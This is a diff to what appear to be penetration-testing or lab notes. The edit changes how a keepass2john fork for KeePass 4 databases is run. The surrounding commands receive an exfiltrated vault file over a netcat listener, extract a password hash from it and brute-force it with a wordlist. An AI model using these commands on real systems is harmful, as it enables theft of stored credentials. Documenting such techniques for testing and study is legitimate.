@@ -255,10 +255,10 @@ nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
 # Standard keepass2john (KeePass v3 only)
 keepass2john system.kdbx > hash.txt
 
-# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
+# For KeePass v4 (KDBX 4.x with Argon2): use custom fork (no Makefile; Python and Perl scripts only)
 git clone https://github.com/ivanmrsulja/keepass2john.git
-cd keepass2john && make
-./keepass2john system.kdbx > hash.txt
+python3 keepass2john/keepass2john.py system.kdbx > hash.txt
+# Perl alternative: perl keepass2john/keepass2john.pl system.kdbx > hash.txt
 
 # Alternative: keepass4brute (direct brute-force)
 python3 keepass4brute.py -d wordlist.txt system.kdbx
